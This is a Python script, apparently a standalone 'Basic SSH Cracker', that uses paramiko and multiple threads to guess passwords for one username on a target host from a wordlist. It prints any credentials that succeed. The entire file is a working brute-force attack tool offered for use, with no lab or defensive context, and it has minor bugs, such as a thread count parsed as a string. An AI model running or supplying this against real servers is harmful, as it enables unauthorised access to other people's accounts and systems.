import paramiko
import argparse
import threading


parser = argparse.ArgumentParser(description="Basic SSH Cracker")

parser.add_argument("-t","--target",required=True,type=str,help="Enter the hostname")
parser.add_argument("-u","--user",type=str,required=True,help="Enter the username")
parser.add_argument("-w","--wordlist",type=str,required=True,help="Enter the path to wordlist")
parser.add_argument("-c","--threads",type=str,default=20,help="enter the number of threads. Default : 20")


args = parser.parse_args()

host = args.target
user = args.user
wordlist = args.wordlist
threads = args.threads




def words(wordlist):
    with open(wordlist , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
        


passwords = words(wordlist)
iter_passwords = iter(passwords)
event_done = threading.Event()




trueuser = None
truepasswd = None

def workers():
    global trueuser, truepasswd
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    while not event_done.is_set():
        try:
            password = next(iter_passwords)
        except StopIteration:
            break
        
        try:
            client.connect(hostname=host, username=user , password=password, timeout=3)
            print("===========================================================================\n")
            print(" The Password was Found and Connection was Success\n")
            print(f"Connect with {host}  as   {user}  :   {password}\n")
            trueuser = user
            truepasswd = password
    
            break
        
        except Exception as e:
            print(f" the connnection was failed with {host}  ")



thread_list = []
for _ in range(threads):
    t= threading.Thread(target=workers)
    t.start()
    thread_list.append(t) 



for t in thread_list:
    t.join()





print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
print("===========================================================================\n")
if trueuser and truepasswd:
    print(f"\n[+] Found credentials: {trueuser}   :   {truepasswd}\n")
else:
    print("\n[-] No valid credentials found.")